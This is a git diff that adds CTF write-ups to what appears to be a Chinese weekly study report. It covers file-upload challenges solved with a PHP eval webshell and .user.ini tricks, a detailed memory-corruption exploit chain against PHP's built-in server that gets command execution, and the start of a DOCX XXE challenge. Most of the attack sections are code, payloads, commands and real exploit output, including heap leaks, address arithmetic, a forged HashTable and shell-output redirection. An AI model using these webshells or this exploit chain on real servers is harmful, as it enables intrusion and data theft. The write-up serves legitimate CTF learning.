@@ -1,4 +1,4 @@
----
+﻿---
 title: "2026年11月第1周周报"
 date: 2026-11-07
 published: 2026-11-07
@@ -20,6 +20,7 @@ image: ./images/cover3.jpg
 <a href="#三geek" style="flex:none;padding:0.35rem 0.6rem;border-radius:0.5rem;background:rgba(128,128,128,0.14);font-weight:600;text-decoration:none;white-space:nowrap;">三.Geek</a>
 <a href="#四ctfshow" style="flex:none;padding:0.35rem 0.6rem;border-radius:0.5rem;background:rgba(128,128,128,0.14);font-weight:600;text-decoration:none;white-space:nowrap;">四.CTFshow</a>
 <a href="#week4" style="flex:none;padding:0.35rem 0.6rem;border-radius:0.5rem;background:rgba(128,128,128,0.14);font-weight:600;text-decoration:none;white-space:nowrap;">WEEK4</a>
+<a href="#week5" style="flex:none;padding:0.35rem 0.6rem;border-radius:0.5rem;background:rgba(128,128,128,0.14);font-weight:600;text-decoration:none;white-space:nowrap;">WEEK5</a>
 </div>
 
 
@@ -70,6 +71,15 @@ image: ./images/cover3.jpg
   - [95（简单题）](#92简单题)
   - [96](#96)
   - [97](#97)
+- [WEEK5](#week5)
+  - [151（基础）](#151基础)
+  - [152](#152)
+  - [153](#153)
+  - [154](#154)
+  - [156](#156)
+  - [157](#157)
+  - [五.邻里交换所 php2shell](#五邻里交换所-php2shell)
+  - [六.hyw工业 DOCX 元数据 XXE](#六hyw工业-docx-元数据-xxe)
 
 ---
 #  一.CTFshow SQL 
@@ -2969,6 +2979,8 @@ conten=<?=highlight_file('flag36d.php');?>
 ![alt text](image-71.png)
 </font>
 
+# WEEK5
+
 ## 文件上传漏洞
 ### 151（基础）
 
@@ -3142,11 +3154,11 @@ GET /upload/shell.php  →  去"仓库"，把那箱子拿出来用
 ---
 
 
-## 152
+### 152
 解法一样
 ![alt text](image-80.png)
 ![alt text](image-81.png)
-## 153
+### 153
 ![alt text](image-82.png)
 ##### 1.**`\u6587\u4ef6\u7c7b\u578b\u4e0d\u5408\u6cd5` 就是「文件类型不合法」。** 上传被直接拒绝了，所以 `/upload/shell.php` 是 404。
 ##### 2.查询上级目录被拒，证明多加了一层文件名后缀校验
@@ -3217,6 +3229,7 @@ https://ada81ef9-.../upload/.../  →  nginx/1.16.1            （另一个服�
     POST /upload.php
     filename="shell.png"    Content-Type: image/png
     body: <?=highlight_file('/var/www/html/flag.php');?>
+    /var/www/html/flag.php     ← 直接指向文件，不经过任何路径推断
 
 第二发
     POST /upload.php
@@ -3294,3 +3307,1061 @@ php-fpm 定位脚本 = /upload/index.php
 
 访问 `/upload/index.php` 时，PHP 会先读取同目录的 `.user.ini`，按里面的 `auto_append_file=shell.png` 这条配置，在 index.php 执行完之后，再把 `shell.png` 的内容接上来一起执行；而 `shell.png` 的内容是读 flag 的代码，所以最终能看到 flag。
 ![alt text](image-88.png)
+
+### 154
+##### eval是php里面的代码执行函数
+eval(字符串)  →  把这段字符串当作 PHP 代码，现场解析并执行
+#### 1.解析我的步骤
+##### 1.先按原来步骤走抓到包后，在body里拼接eval函数让其能够在地址栏用绝对路径直接访问flag.php
+先在文件名为shell.png时
+写<?=eval($_REQUEST['a']);?>
+再用文件名为.user.ini
+写auto_append_file=shell.png
+最后在再浏览器访问，/upload/index.php?a=system(%27cat%20/var/www/html/flag.php%27);
+##### 2.<font color="red">用他的主要原因
+“GET 里的 `php` 不会被检测”，「检测只发生在上传那一步，GET 参数根本不在检测范围里」。</font>
+```php
+① 上传 shell.png
+   body = <?=eval($_REQUEST['a']);?>
+   这一刻被检测：内容里没有 php → 通过
+
+② 上传 .user.ini
+   body = auto_append_file=shell.png
+   这一刻被检测：内容里没有 php → 通过
+
+③ GET /upload/index.php?a=system('cat /var/www/html/flag.php');
+   这一刻**根本没有检测**——文件早传完了，现在是“用”的时候
+```
+![alt text](image-91.png)
+##### 3.注意一定要用查源码，因为
+
+```php
+**服务器返回的是纯文本源码：**
+
+
+nothing here<?php
+
+$flag="ctfshow{...}";
+
+
+**但它的 `Content-Type` 是 `text/html`，浏览器会按 HTML 解析。**
+
+**浏览器看到 `<?php` 时，会把它当成一个未知的标签或注释（HTML 里的 `<?` 属于 "bogus comment"）并开始忽略，一直吞到 `?>`。** 所以：
+
+nothing here       ←  普通文本，正常显示
+<?php ... ?>       ←  被当成 HTML 标签，整段吞掉，不渲染
+
+**结果页面只剩 `nothing here`，flag 放在源码里。**
+```
+![alt text](image-90.png)
+
+#### 2.补充，如果想要查服务器有哪些文件可以用这些命令查
+##### 一、查询目录和文件名的命令表
+
+**所有命令都要放进 `?a=system('...');` 里，单引号和空格需要编码：`%27` 表示 `'`，`%20` 表示空格。**
+
+表格
+
+| 目的 | 命令 | URL 写法 |
+| --- | --- | --- |
+| 列出当前目录 | `ls` | `?a=system(%27ls%27);` |
+| 列出当前目录（含隐藏文件、权限等详细信息） | `ls -la` | `?a=system(%27ls%20-la%27);` |
+| 列出指定目录 | `ls -la /var/www/html/` | `?a=system(%27ls%20-la%20/var/www/html/%27);` |
+| 递归列出全部子目录 | `ls -R /var/www/html/` | `?a=system(%27ls%20-R%20/var/www/html/%27);` |
+| 按文件名搜索 | `find / -name "flag*"` | `?a=system(%27find%20/%20-name%20%22flag%2A%22%27);` |
+| 忽略大小写按文件名搜索 | `find / -iname "*fl*g*"` | `?a=system(%27find%20/%20-iname%20%22%2Afl%2Ag%2A%22%27);` |
+| 按内容搜索 flag | `grep -r "ctfshow{" /var/www/html/` | `?a=system(%27grep%20-r%20%22ctfshow%7B%22%20/var/www/html/%27);` |
+| 读文件 | `cat 文件路径` | `?a=system(%27cat%20/var/www/html/flag.php%27);` |
+| 读文件（不带上色） | `tac`、`head`、`tail` | 同上 |
+| 读文件（PHP 函数） | `highlight_file('/路径')` | `?a=highlight_file(%27/路径%27);` |
+
+**编码速查：**
+
+```
+%27  单引号 '
+%20  空格
+%22  双引号 "
+%2A  星号 *
+%7B  左大括号 {
+```
+
+##### 二、服务器的目录结构表（`ls -R` 的返回结果）
+
+```
+/var/www/html/                       ← 网站根目录
+├── flag.php                         ← ★ flag 就在这
+├── index.php                        ← 上传页
+├── upload.php                       ← 上传接口
+├── images/
+│   ├── WePayLogo.png
+│   └── logo2.png
+├── js/
+│   └── jquery-3.2.1.min.js
+├── layui/                           ← 前端框架（layui）
+│   ├── css/
+│   │   ├── layui.css
+│   │   ├── layui.mobile.css
+│   │   └── modules/
+│   │       ├── code.css
+│   │       ├── laydate/default/laydate.css
+│   │       └── layer/default/（图标、loading 动图、layer.css）
+│   ├── font/
+│   │   ├── iconfont.eot / .svg / .ttf / .woff / .woff2
+│   ├── images/face/                 ← 0.gif ~ 71.gif（layui 表情）
+│   ├── lay/
+│   │   └── modules/                 ← carousel.js / code.js / element.js ...
+│   │                                  （20 个 layui 模块 js）
+│   ├── layui.all.js
+│   └── layui.js
+└── upload/                          ← 你的落脚点
+    ├── index.php                    ← "nothing here"，.user.ini 的宿主
+    └── shell.png                    ← 你的 payload
+```
+
+```
+### `/var/` —— 可变数据
+
+
+/var/
+├── www/            ← Web 根目录（本题的落脚点）
+│   └── html/       ← 站点文件
+├── log/            ← 日志
+│   ├── nginx/
+│   └── php-fpm/
+├── run/            ← 运行时 pid、socket
+├── lib/            ← 包管理数据
+└── tmp/            ← 临时
+
+
+### `/var/www/html/` —— 网站根
+
+
+/var/www/html/
+├── index.php      入口页
+├── flag.php       ★ flag
+├── upload.php     接口
+├── upload/        上传目录
+├── images/        静态图
+├── js/            前端脚本
+└── layui/         前端框架
+```
+![alt text](image-92.png)
+
+### 156
+![alt text](image-93.png)
+##### 1.过滤了“[  ]”,但在php7版本下“{ }”与其等效
+![alt text](image-94.png)
+![alt text](image-95.png)
+
+
+### 157
+```
+① 不带 ;        →  ; 被过滤，删掉（PHP 最后一句可以不带分号）
+② 不用 [] {}    →  直接写死命令，不传参
+③ 用 fl* 代替 flag.php  →  php 被过滤，用通配符匹配
+```
+
+![alt text](image-96.png)
+
+
+## 一、先理解一次上传请求分成哪几块
+
+```
+POST /upload.php                     ← 地址
+Host: xxx                            ← 头
+Content-Type: multipart/form-data    ← 头
+
+------boundary
+Content-Disposition: form-data; name="file"; filename="shell.png"   ← ① 文件名
+Content-Type: image/png                                             ← ② 类型
+
+<?=eval($_REQUEST{'a'});?>                                          ← ③ 内容
+------boundary--
+```
+
+**一次上传有三样信息：**
+
+```
+① 文件名   filename="shell.png"
+② 类型     Content-Type: image/png
+③ 内容     <?=eval(...)?>   ← body 里空行之后的字节
+```
+
+## 二、正则检查的是第 ③ 块：文件内容
+
+**`upload.php` 里的代码大致是：**
+
+```
+// 先拿到“内容”这一段
+$content = file_get_contents($_FILES['file']['tmp_name']);
+
+// 再用正则扫它
+if (preg_match('/php/i', $content)) {
+    echo '{"code":2,"msg":"文件类型不合法"}';
+    exit;
+}
+```
+
+**`$content` 里装的就是你上传的 payload 原文（也就是第 ③ 块）。**
+
+**`preg_match` 会在 `$content` 里寻找是否出现 `php` 这三个字符。找到就拒绝，找不到就放行。**
+
+## 三、具体每关检查什么
+
+表格
+
+| 题 | 检查内容里的 | 代码 |
+| --- | --- | --- |
+| 154/155 | `php` | `preg_match('/php/i', $content)` |
+| 156 | `[` 和 `]` | `preg_match('/[\[\]]/', $content)` |
+| 157 | `{`、`}`、`;` | `preg_match('/[{};]/', $content)` |
+
+**所以只要文件内容里有这些字符，就会被拒绝。**
+
+## 四、不检查什么
+
+**初学者最容易混淆的：正则**不检查 ** 这些：
+
+```
+❌ URL 参数里的 ?a=system(...)       ← 不检查
+❌ 文件名里的 shell.png               ← 不检查（后缀另有单独规则）
+❌ User-Agent、Referer 等头           ← 不检查
+❌ .user.ini 的内容                  ← 不检查（这也是它成为突破口的原因）
+```
+
+**这就是为什么：**
+
+```
+文件内容不能写 php            → 但 URL 里 ?a=system('cat flag.php') 随便写 php
+```
+
+**安全检查只覆盖 “文件内容” 这一条路径，其他路径都没有被检查。**
+
+## 五、用一个比喻
+
+```
+一次上传 = 寄一个包裹
+
+① 包裹单上的名字（filename）
+② 包裹单上的分类（Content-Type）
+③ 包裹里的东西（内容）
+
+正则 = 安检员只开箱看“包裹里的东西”
+```
+
+**你只要保证 “箱子里的东西” 没写 `php`、`[]`、`{}`、`;`，就能过。**
+
+**至于包裹单上写什么（比如 `.user.ini`）、URL 里怎么喊（比如 `?a=...`），安检员根本不看。**
+
+## 六、一句话
+
+```
+正则检查的对象 = 上传文件的“内容字节”
+正则不检查的   = 文件名、URL、Header、.user.ini
+```
+
+**所以所有绕过，都是在 “让内容里不出现被拦的字符” 上做文章。**
+
+---
+
+## 五.邻里交换所 php2shell
+
+### 1.题目与思路
+
+| 项 | 内容 |
+|---|---|
+| 题目 | 邻里交换所 \| 给好物找个新家 |
+| 类型 | Web / PHP 8.4.26 / php2shell（CVE-2026-109618、CVE-2026-109619） |
+| 入口 | 静态首页 + `/api/items.php?id=` |
+| 结果 | RCE，`www-data` 权限，读环境变量拿 flag |
+| Flag | `SYC{f2b620ee-d2a7-4685-b4ac-1efbbed15b5b}` |
+
+**一句话思路**：题目把一台 **PHP 8.4.26 的 `php -S`** 藏在静态页面后面，先用草稿接口把「版本号 + worker 编号」白送给你，剩下的活儿就是照着版本号去打 2026 年 10 月披露的 php2shell。
+
+这题不是常规 Web 业务题，硬啃之前得先接受一个事实：**漏洞在 PHP 内核里，不在页面的代码里。**
+
+---
+
+### 2.摸接口与草稿泄露
+
+#### 1.先看首页
+首页是一张纯静态的“邻里交换所”页面，标题「给好物找个新家」，只有首页、`#items`、`#lookup` 三个锚点。三张物品卡片分别指向：
+
+```html
+<a href="/api/items.php?id=101">
+<a href="/api/items.php?id=102">
+<a href="/api/items.php?id=103">
+```
+
+请求任意一个：
+
+```bash
+curl 'http://.../api/items.php?id=101'
+```
+
+```json
+{"id":101,"title":"复古木质台灯","status":"available","owner":"林先生 · 2 号楼","description":"..."}
+```
+
+<font color="red">`id` 是个字典键，不是数据库主键。这一步先把“它怎么取数据”的形状记下来。</font>
+
+#### 2.先试便宜的：注入、包含，全是 `item_not_found`
+
+| 试的 payload | 返回 |
+|---|---|
+| `id=101'` | `{"error":"item_not_found"}` |
+| `id=101 AND 1=1` | 同上 |
+| `id=1 or 1=1` | 同上 |
+| `id=../../etc/passwd` | 同上 |
+| `id=php://filter/convert.base64-encode/resource=index` | 同上 |
+
+结论：**不是 SQL 注入，也不是直接的 LFI。** `id` 是严格匹配的字典键（做了 `trim`，但引号、空格、`UNION`、`SLEEP()` 全不认）。
+
+<font color="red">这一步的意义：把便宜的路先排掉。后面看到版本号时，我才不会又回头去试注入。</font>
+
+#### 3.把 id 加到 104，草稿自己送上门
+
+```bash
+curl 'http://.../api/items.php?id=104'
+```
+
+```json
+{
+  "id": 104,
+  "title": "未发布的旧相机",
+  "status": "private_draft",
+  "owner": "邻里交换所 · 草稿",
+  "description": "预览入口尚未公开，勿转发。",
+  "preview_path": "/api/media/preview/7d4b1c8e92a6f0435bd0.php"
+}
+```
+
+![104 号草稿与 preview 探针](./images/weekly/image-62.png)
+
+这就是一道 **IDOR / 草稿泄露**：接口没校验 `private_draft`，把预览入口一起吐了出来。<font color="red">很多题到这里就结束了，这题不是——`preview_path` 只是下一段的门票。</font>
+
+---
+
+### 3.preview 探针
+
+```bash
+curl 'http://.../api/media/preview/7d4b1c8e92a6f0435bd0.php'
+```
+
+```text
+PHP 8.4.26
+worker=7
+```
+
+多刷几次，`worker` 会在 1、7、8、9、10 之间跳。这个接口没有参数、不读文件，但它给了两条极关键的信息：
+
+1. **PHP 版本 = 8.4.26**；
+2. 服务端是**多 worker 的 PHP 进程模型**（后面 `env` 确认 `PHP_CLI_SERVER_WORKERS=4`）。
+
+再补一刀：访问 `/api/flag.php` 返回的 404 长这样：
+
+```html
+<h1>Not Found</h1>
+<p>The requested resource <code class="url">/api/flag.php</code> was not found on this server.</p>
+```
+
+这是 **PHP 内置开发服务器 `php -S`** 的经典 404 模板。<font color="red">到这一步可以确定：不是 Apache mod_php，也不是 FPM，是 CLI server 并且开了多 worker。</font>
+
+#### 为什么 8.4.26 这个数字值得停下来
+
+2026-09-24 发布的 **8.4.26 正好是 php2shell 的最后一个受影响版本**；8.4.27（2026-10-21）才修掉 CVE-2026-109618 / 109619。
+
+受影响范围：
+
+| 分支 | 受影响 | 修复版本 |
+|---|---|---|
+| 8.2 | `< 8.2.35` | 8.2.35 |
+| 8.3 | `< 8.3.36` | 8.3.36 |
+| 8.4 | `< 8.4.27` | 8.4.27 |
+| 8.5 | `< 8.5.12` | 8.5.12 |
+
+<font color="red">判据：版本号 + SAPI（`php -S`）+ worker 号，三样凑齐。这时我就不再翻页面的业务逻辑了，直接去查这个版本的 CVE。</font>
+
+---
+
+### 4.php2shell 原理
+
+> **名词：RINIT（Request INIT）** —— PHP 处理一个请求的初始化阶段，建 `$_GET`/`$_POST`、初始化 session 都在这里，**早于**路由和业务代码。
+>
+> **名词：`session.upload_progress`** —— PHP 的一个默认开启的特性：上传文件时，服务端会把上传进度写进 session。它导致 **multipart 的解析和 session 的初始化被提前到 `php_request_startup()` 里**。
+>
+> **名词：OOM 与 `zend_bailout()`** —— 内存超限时 PHP 不“正常 return”，而是用 `longjmp` 直接跳出去。正常 return 会走清理，`longjmp` 会**跳过一部分清理**。
+
+流程大概是：
+
+```text
+php_request_startup()
+  └─ php_hash_environment()
+      └─ sapi_handle_post()
+          └─ rfc1867_post_handler()      // 解析 multipart
+              └─ php_session_initialize()
+                  └─ php_session_decode()
+```
+
+关键点：**只要 `session.upload_progress.enabled=1`（默认就是 1），攻击者发一个带 `PHP_SESSION_UPLOAD_PROGRESS` 的 multipart，PHP 就会在业务代码之前碰 session。**
+
+如果 OOM 恰好发生在「session 数据已发布、清理还没执行」的那一刻，worker 里就留下指向“本次请求堆内存”的全局指针：`PS(id)`、`PS(mod_data)`、`PS(hash_serialize_verifier)` 等等。请求结束后堆被释放，但 worker 是**持久进程**，指针还在原地——这就是跨请求的**悬挂指针 / use-after-free**。
+
+> **名词：UAF（Use-After-Free）** —— 内存已经释放，指针还指着它，后面的人再读/写这块内存，读到的就是“别人的数据”或者能改到不该改的结构。
+
+两个 CVE 的分工：
+
+| CVE | 干了什么 | 修复方式 |
+|---|---|---|
+| CVE-2026-109618（GHSA-w8hw-w9fx-j79w） | OOM 造成 request 内存状态损坏，shutdown 时读/跳到非法状态 → RCE | 移除 OOM 的 `longjmp`，改成软 OOM + 更高阈值硬 OOM |
+| CVE-2026-109619（GHSA-6wmf-4rv5-p3rp） | 悬挂的 session/error/object 全局状态被后续请求消费，UAF → RCE | 在 RINIT 前重置这些全局状态 |
+
+**为什么 `php -S` 特别适合打这个**：
+
+- worker 持久，一个请求 OOM 后不会被杀，继续接下一个请求；
+- `session.upload_progress` 默认开；
+- 多 worker 是 fork 出来的，**代码段共享**，所以所有 worker 的代码地址（ASLR 基址）一致；
+- 目标够“安静”，堆布局很确定，可以一个请求泄、下一个请求用。
+
+> **名词：ASLR** —— 地址空间随机化，每次程序启动把代码/堆/栈放到随机地址。所以要先“泄露地址”，才能构造指向它的 payload。fork 出来的子进程继承父进程的映射，因此基址相同。
+
+`preview` 回显 `worker=N` 的用处就在这：它是“当前请求落在哪个 worker”的探针。实际打的时候堆布局够稳，不必严格钉同一个 worker，但调试时很好用。
+
+---
+
+### 5.利用链四步
+
+公开链（KillaBoi 的 Steal My Bitcoin PoC、djad04 的 deep-dive）把利用分成四段。我基本照搬，只针对这题改了三处适配（后面踩坑里写）。
+
+#### 1.Heap leak：让 `Set-Cookie` 越界读出 256 字节堆
+
+**Producer（A1）** 是一个 multipart 请求，核心字段：
+
+```text
+PHPSESSID
+PHP_SESSION_UPLOAD_PROGRESS
+files[R00000...][a][a]...   （大量嵌套空文件字段）
+f0000...（填充字段）
+b0000...（大 value）
+u00...（burner）
+```
+
+它让 PHP 在 `rfc1867_post_handler()` 的 session 编码阶段 OOM。OOM 之后 `PS(id)` 没被重置，`send_cookie=1` 让 PHP 还想写 `Set-Cookie: PHPSESSID=...`，但 `PS(id)` 指向的 `zend_string` 已经被释放/复用。
+
+**Consumer（B1）** 是个小 multipart：51 个 padding 字段 + 一个重复 key + 一个 79 字节的伪造值，把 `PS(id)` 指向的 `zend_string` 头改写成：
+
+```text
+len  = 256
+data = "L" + ...
+```
+
+于是 PHP 生成 `Set-Cookie` 时把这个“字符串”当 256 字节读，**越界读出 256 字节堆内存**，里面是几个 2 MiB 对齐的堆指针，解析出 Zend MM 的 chunk base。
+
+> **名词：chunk** —— Zend 内存管理器按 2 MiB 一块向系统要内存，再切成小块分配。堆地址就是“块基址 + 块内偏移”。
+
+实际输出：
+
+```text
+Set-Cookie: PHPSESSID=LAAAA...   （256 raw bytes）
+cookie hex: 4c414141...08c78030f208decba0400713547f0000...
+CANDIDATE 0x7f5413000000
+```
+
+#### 2.Code leak：读出一个函数指针
+
+第二阶段换一个 OOM 形状，让 consumer 把 `PS(id)` 的头改成 `len=16`、`nNextFreeElement=16`，越界读 16 字节：
+
+```text
+10 00 00 00 00 00 00 00   30 29 b1 9d ca 55 00 00
+```
+
+后 8 字节是代码指针：
+
+```text
+zval_ptr_dtor = 0x55ca9db12930
+```
+
+**校验**：低 21 位必须是 `0x112930`（PHP 8.4.26 Alpine 构建的指纹）。命中了。
+
+#### 3.算出 `zif_system`
+
+```text
+zif_system = zval_ptr_dtor - 0x204BC0
+           = 0x55ca9d90dd70
+```
+
+代码段 fork 后所有 worker 共享，这个地址可以直接用于 callback。
+
+> **名词：`zif_system`** —— PHP 内部 `system()` 函数的实现入口（`zif_` 前缀 = Zend Internal Function）。拿到它 = 拿到命令执行。
+
+#### 4.伪造 HashTable，劫持 `pDestructor`
+
+最后一步不用再 leak，只要把一个 384 字节的伪造结构送进堆，让它落在可预测地址：
+
+```text
+heap_base - DELTA + 0x16D1D8
+```
+
+- `DELTA` = 若干个 2 MiB chunk（公开常量 66 个，即 `0x8400000`）；
+- `0x16D1D8` 是 chunk 内的固定偏移。
+
+这 384 字节一身三职：
+
+1. **`zend_array` / HashTable 头**：`nTableSize`、`nNumUsed`、`pDestructor`；
+2. **fake execute_data**：让 `zend_call_function` 能走通；
+3. **`zend_string`**：存放要执行的命令。
+
+```python
+struct.pack_into("<Q", buf, 0x30, zif_system)   # pDestructor
+struct.pack_into("<Q", buf, 0x70, addr + 0x80)  # fake execute_data
+struct.pack_into("<II", buf, 0x80, 1, 0x106)    # zend_string 头
+buf[0x98:0x98+len(command)] = command
+```
+
+callback 的 multipart 顺序（**顺序是关键**）：
+
+```text
+1000 × f[i][x][x]...[x]   // 1000 个嵌套空文件字段，堆布局/OOM fuel
+primer                    // 276 字节，offset 104 写入 target 地址
+a = 1                     // spacer，触发 zend_hash_real_init_mixed
+hold = 384B forged table  // 伪造的 HashTable
+K*128000 + "[x]"          // 巨型字段名，触发最后一次 OOM
+```
+
+`hold` 必须先被解析并分配；`K` 的分配失败触发 OOM、进入 shutdown；`zend_hash_destroy` 遍历到被 primer 覆盖的 bucket 时，调用 `pDestructor` —— 也就是 `zif_system`。
+
+> **名词：HashTable 的 `pDestructor`** —— 哈希表销毁每个元素时调用的回调函数指针。把它改掉，等于让 PHP 在“正常清理内存”时替我们执行任意函数。
+>
+> **名词：execute_data** —— 一次函数调用的上下文结构。`zend_call_function` 要读它，所以伪造 HashTable 旁边得摆一个能骗过它的 fake 结构。
+
+---
+
+### 6.命令回显
+
+`zif_system` 的 stdout 默认不回 HTTP 响应（它写到 CLI server 的 stdout）。所以命令得自己找当前 worker 的 TCP socket，把输出重定向过去：
+
+```sh
+i=$(awk '$4=="01"{print $10;exit}' /proc/net/tcp*)
+f=5
+for x in /proc/self/fd/*; do
+  [ "$(readlink "$x")" = "socket:[$i]" ] && f=${x##*/}
+done
+eval "{ ... }>&$f 2>&$f"
+```
+
+- `/proc/net/tcp*` 里 `$4=="01"` 是 ESTABLISHED；
+- `$10` 是 socket inode；
+- 在 `/proc/self/fd` 里找 `socket:[inode]` 对应的 fd；
+- 把命令组 stdout/stderr 都重定向到那个 fd。
+
+> **名词：fd（文件描述符）** —— Linux 里一切皆文件，socket 也是一个 fd。找到“我这条 HTTP 连接”的 fd，就能往响应体里塞字节。
+
+因为这是在响应发送过程中执行的，输出会以额外 chunk 混进 body，实测直接在 `http.client` 的 body 里看到：
+
+```text
+Fatal error: Allowed memory size ...
+PWNED
+uid=82(www-data) gid=82(www-data) groups=82(www-data)
+```
+
+---
+
+### 7.实操与输出
+
+#### 1.环境
+
+- Python 3.10+，**只用标准库**（`socket`、`http.client`、`struct`、`re`）；
+- 不需要 Docker、不需要本地 PHP、不需要 gdb。
+
+```text
+exploit/
+├── run_all.py
+├── calibration.py
+├── consumers.py
+├── http_framing.py
+├── memory_exhaustion.py
+├── hashtable_forge.py
+└── command.py
+```
+
+`run_all.py` 主流程：
+
+```python
+heap_base, _ = leak(HEAP_STAGE)      # 1) heap leak
+dtor, _ = leak(CODE_STAGE)           # 2) code leak
+for chunks in (66, 64, 65, 63, 67, 62, 68):
+    status, body, addr = callback(heap_base, dtor, chunks, command)
+    if b"PWNED" in body:
+        ...
+```
+
+#### 2.heap / code leak 的真实输出
+
+![Heap leak / Code leak](./images/weekly/image-63.png)
+
+heap leak 的 producer 响应：
+
+```http
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+
+<b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000. ...
+<b>Warning</b>:  PHP Request Startup: Session cookie cannot be sent after headers have already been sent ...
+<b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted ...
+```
+
+consumer 响应：
+
+```http
+HTTP/1.1 200 OK
+Set-Cookie: PHPSESSID=LAAAAAAAA...%1A%2BP%0C_%A1%BET%A0%40gZX%7F...
+```
+
+那 256 字节 cookie 就是堆泄露，解析得 `0x7f5413000000`。
+
+code leak 返回 16 字节：
+
+```text
+10000000000000003029b19dca550000
+```
+
+```text
+len = 16
+zval_ptr_dtor = 0x55ca9db12930
+低 21 位 = 0x112930  ✅
+```
+
+#### 3.callback：N=66 直接命中
+
+```text
+N=66 target=0x7f540ad6d1d8 status=200 len=1443 hit=True
+```
+
+![伪造 HashTable → RCE → Flag](./images/weekly/image-64.png)
+
+```text
+PWNED
+uid=82(www-data) gid=82(www-data) groups=82(www-data)
+total 68
+drwxr-xr-x    1 root root 4096 Nov 17 14:07 .
+drwxr-xr-x    1 root root 4096 Nov 13 10:10 app
+...
+```
+
+#### 4.读 flag：`/flag` 居然不存在
+
+第一条命令自然是：
+
+```sh
+echo PWNED; id; ls -la /; cat /flag* /flag /flag.txt 2>/dev/null
+```
+
+结果 `ls /` 里没有 `/flag`，`cat` 也没输出。换成：
+
+```sh
+ls -la /app; env; cat /app/flag* 2>/dev/null
+```
+
+```text
+FIND
+total 32
+drwxr-xr-x ... api
+-rwxr-xr-x ... index.php
+-rwxr-xr-x ... style.css
+drwxr-xr-x ... uploads
+
+PHP_VERSION=8.4.26
+PHP_CLI_SERVER_WORKERS=4
+...
+FLAG=SYC{f2b620ee-d2a7-4685-b4ac-1efbbed15b5b}
+```
+
+<font color="red">Flag 在环境变量 `FLAG` 里。拿到 shell 的第一轮命令应该固定成 `id; ls -la /; env; find / -maxdepth 3 -name '*flag*' 2>/dev/null`，不要只盯 `/flag`。</font>
+
+---
+
+### 8.踩坑
+
+| # | 坑 | 现象 | 怎么绕 |
+|---|---|---|---|
+| 1 | 以为是 SQL 注入 / LFI | `101'`、`UNION`、`../../etc/passwd`、`php://filter` 全返回 `item_not_found` | `id` 是严格匹配的字典键，趁早放弃 |
+| 2 | 想用 PHP 内置服务器的源码泄露（Bug #71559） | 两个请求 pipelining，想把 `.php` 当静态文件读源码，返回的还是正常 JSON | 7.4.22 已修，8.4.26 打不动 |
+| 3 | 域名过滤 | `Host` 不对时返回中文“域名未备案”404 | 请求必须带正确 `Host`，否则连不上题 |
+| 4 | 照抄公开 exp 的 8 个 consumer | 第 2 个 consumer 起返回 404 / 32 字节普通 cookie，脚本直接退出 | 改成「至少 1 个 consumer 给出合法候选」，只发 1 个 |
+| 5 | 找 `X-Powered-By: PHP/8.4.26` | 目标 `expose_php=Off`，没有版本头 | 用 preview 探针 + code leak 低 21 位指纹确认版本 |
+| 6 | carrier delta 硬编码 66 | 换实例后 N=64/65 才命中，有时 66 | 扫描 `66, 64, 65, 63, 67, 62, 68`，命中即停 |
+| 7 | 一连串错误 delta 把实例打挂 | 健康检查返回 502「题目实例暂时不可用」，重启后 ASLR 变了 | fresh 实例上先 leak、立刻用对 delta 打，别拿旧地址硬试 |
+| 8 | 只找 `/flag` | `ls /` 没有，`cat /flag*` 空 | flag 在 `env` 里 |
+
+<font color="red">这题最贵的经验是第 7 条：**地址是有寿命的。** 实例一重启，之前 leak 的 heap_base 全作废，必须重来。</font>
+
+---
+
+### 9.知识点小结
+
+| 考点 | 要点 |
+|---|---|
+| 信息泄露的价值 | 一个“只回显版本 + worker”的调试接口，直接决定了整题的解法 |
+| 版本比对 | 8.4.26 = php2shell 最后受影响版；8.4.27 修复 |
+| RINIT 之前 | `session.upload_progress` 让 multipart 与 session 在业务代码前被处理 |
+| OOM | `zend_bailout()` 用 `longjmp` 跳出，跳过清理 → 悬挂指针 |
+| 持久 worker | `php -S` 的 worker 不死，UAF 才能跨请求利用 |
+| 两次 leak | `Set-Cookie` 长度被改写 → 越界读堆（256 字节）/ 读代码指针（16 字节） |
+| 地址计算 | `zif_system = zval_ptr_dtor - 0x204BC0`，低 21 位指纹校验构建 |
+| 劫持点 | 伪造 HashTable 改 `pDestructor`，在 shutdown 遍历时执行 |
+| 回显 | `/proc/net/tcp` 找 ESTABLISHED inode → `/proc/self/fd` 找 socket → 重定向 |
+| 拿 flag | 先 `env`，flag 不一定在 `/flag` |
+
+**一句话总结**：<font color="red">这题表面是“草稿泄露”，实际是**用一个调试接口把版本号骗出来，然后照着版本号打内核**——页面上的洞只是让你知道该翻哪一页 CVE。</font>
+
+```text
+SYC{f2b620ee-d2a7-4685-b4ac-1efbbed15b5b}
+```
+
+---
+
+## 六.hyw工业 DOCX 元数据 XXE
+
+### 1.题目信息与思路
+
+| 项 | 内容 |
+|---|---|
+| 题目 | hyw工业 - 人才招聘系统 V2 / 简历极速索引系统 |
+| 类型 | Web / Flask-Werkzeug / DOCX 元数据 / XXE（CWE-611） |
+| 入口 | 简历上传表单，字段名 `file`，只收 `.docx` |
+| 结果 | 读取 `/flag`，flag 直接回显在“作者”位置 |
+| Flag | `SYC{f08e4d41-2fb5-4f8f-bd86-fb27936d4db3}` |
+
+**一句话思路**：公告说“V2 只读简历的**元数据**、不读全文”，而元数据 `docProps/core.xml` **本身就是一个 XML**——只要解析器没关外部实体，改一个 `<dc:creator>` 就能让服务端把 `/flag` 当作者名念给你听。
+
+---
+
+### 2.首页公告
+
+```bash
+curl -i 'http://.../'
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Server: Werkzeug/2.3.6 Python/3.9.25
+```
+
+```html
+<title>hyw工业 - 人才招聘系统 V2</title>
+<h1>hyw工业 - 简历极速索引系统</h1>
+```
+
+公告原文：
+
+> HR 部门 V2 更新公告：
+> 之前提取全文太慢了！为了进一步提升效率，我们重新编写了架构。现在系统**只会读取您简历文档的“元数据”**来进行快速建档。请确保您的 `.docx` 简历属性填写正确。
+
+上传表单：
+
+```html
+<form class="upload-form" method="post" enctype="multipart/form-data">
+  <input type="file" id="file-upload" name="file" accept=".docx">
+  <input type="submit" value="提取元数据">
+</form>
+```
+
+![首页与 V2 公告](./images/weekly/image-65.png)
+
+<font color="red">公告里“只读元数据”这五个字不是功能说明，是提示。它等于告诉你：正文不用管，去盯 `docProps/core.xml`。</font>
+
+---
+
+### 3.正常上传看回显
+
